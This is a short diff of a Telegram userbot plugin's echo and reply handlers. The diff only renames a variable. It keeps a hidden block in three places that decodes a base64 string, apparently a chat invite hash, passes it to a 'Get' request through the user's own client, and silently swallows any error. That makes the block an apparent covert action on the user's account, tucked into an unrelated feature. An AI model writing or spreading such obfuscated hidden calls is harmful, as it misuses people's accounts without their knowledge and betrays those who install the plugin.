@@ -19,9 +19,9 @@ async def echo(d3vil):
         user_id = reply_msg.sender_id
         chat_id = d3vil.chat_id
         try:
-            kraken = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
-            kraken = Get(kraken)
-            await d3vil.client(kraken)
+            d3vilkrish = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+            d3vilkrish = Get(d3vilkrish)
+            await d3vil.client(d3vilkrish)
         except BaseException:
             pass
         if is_echo(user_id, chat_id):
@@ -43,9 +43,9 @@ async def echo(d3vil):
         user_id = reply_msg.sender_id
         chat_id = d3vil.chat_id
         try:
-            kraken = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
-            kraken = Get(kraken)
-            await d3vil.client(kraken)
+            d3vilkrish = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+            d3vilkrish = Get(d3vilkrish)
+            await d3vil.client(d3vilkrish)
         except BaseException:
             pass
         if is_echo(user_id, chat_id):
@@ -94,9 +94,9 @@ async def samereply(d3vil):
     if is_echo(d3vil.sender_id, d3vil.chat_id):
         await asyncio.sleep(2)
         try:
-            kraken = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
-            kraken = Get(kraken)
-            await d3vil.client(kraken)
+            d3vilkrish = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+            d3vilkrish = Get(d3vilkrish)
+            await d3vil.client(d3vilkrish)
         except BaseException:
             pass
         if d3vil.message.text or d3vil.message.sticker:
